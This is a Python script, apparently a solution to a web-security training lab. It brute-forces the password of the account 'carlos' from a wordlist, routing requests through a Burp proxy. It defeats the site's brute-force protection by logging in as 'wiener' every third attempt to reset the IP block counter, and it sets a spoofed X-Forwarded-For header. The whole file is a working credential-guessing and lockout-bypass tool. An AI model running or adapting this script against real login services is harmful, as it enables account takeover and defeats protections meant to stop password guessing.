import sys
import requests
import urllib3
import csv
import pandas as pd

# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Update IP as needed to avoid lockout - for larger lists would need to alter more
# Functional but needs optimization
# Need to investigate the web app to determine number of attempts before lockout
# Given username in this case, so skipping enumeration

def password_enum():
    password_list = []
   #for user in valid_users:
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)
        #print(passw)
    headers = {
        "x-forwarded-for": "1.2.3.4"
    }
    pass_index = 0
    for j in range(1,300):
        if j%3 != 0:
            data = {
                "username": "carlos",
                "password": password_list[pass_index]
            }
            r = requests.post(url, data = data, verify=False, proxies=proxies, headers=headers)
            print(f"{password_list[pass_index]} failed")
            if 'Your username is:' in r.text:
                print(f'***** {password_list[pass_index]} valid for carlos *****')
            pass_index += 1
        else:
            data = {
                "username": "wiener",
                "password": "peter"
            }
            r = requests.post(url, data = data, verify=False, proxies=proxies, headers=headers)
            print("IP block reset")
        

if __name__ == "__main__":
    try:
        #valid_usernames = []
        url = sys.argv[1].strip()
        #valid_usernames = valid_usernames.append(sys.argv[2].strip())
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    #print('[-] Performing user enumeration')
    #valid_usernames = username_enum(url)
    #print(valid_usernames)
    print('[-] Performing password enumeration')
    valid_passwords = password_enum()

